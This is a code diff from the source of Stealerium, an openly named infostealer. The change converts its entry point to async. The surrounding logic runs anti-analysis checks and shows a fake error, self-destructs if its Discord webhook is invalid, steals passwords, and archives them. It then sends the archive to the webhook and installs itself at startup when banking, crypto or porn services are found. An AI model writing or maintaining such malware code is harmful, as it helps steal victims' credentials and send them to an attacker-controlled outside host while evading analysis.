@@ -2,6 +2,7 @@
 using System.IO;
 using System.Net;
 using System.Threading;
+using System.Threading.Tasks;
 using Stealerium.Helpers;
 using Stealerium.Modules;
 using Stealerium.Modules.Implant;
@@ -13,7 +14,7 @@ namespace Stealerium
     {
         /// <summary>Defines the entry point of the application.</summary>
         [STAThread]
-        private static void Main()
+        private static async Task Main()
         {
             Thread
                 wThread = null,
@@ -21,7 +22,7 @@ namespace Stealerium
 
             // SSL
             ServicePointManager.Expect100Continue = true;
-            ServicePointManager.SecurityProtocol = (SecurityProtocolType) 3072;
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
             ServicePointManager.DefaultConnectionLimit = 9999;
 
             // Mutex check
@@ -40,7 +41,7 @@ namespace Stealerium
                 StartDelay.Run();
 
             // Run AntiAnalysis modules
-            if (AntiAnalysis.Run())
+            if (await AntiAnalysis.RunAsync())
                 AntiAnalysis.FakeErrorMessage();
 
 
@@ -51,7 +52,7 @@ namespace Stealerium
             Config.Init();
 
             // Test Webhook if valid
-            if (!DiscordWebHook.WebhookIsValid())
+            if (!(await DiscordWebHook.WebhookIsValid()))
                 SelfDestruct.Melt();
 
             // Steal passwords
@@ -59,7 +60,7 @@ namespace Stealerium
             // Compress directory
             var archive = Filemanager.CreateArchive(passwords);
             // Send archive
-            DiscordWebHook.SendReport(archive);
+            await DiscordWebHook.SendReport(archive);
 
             // Install to startup if enabled in config and not installed
             if (Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices || Counter.PornServices))
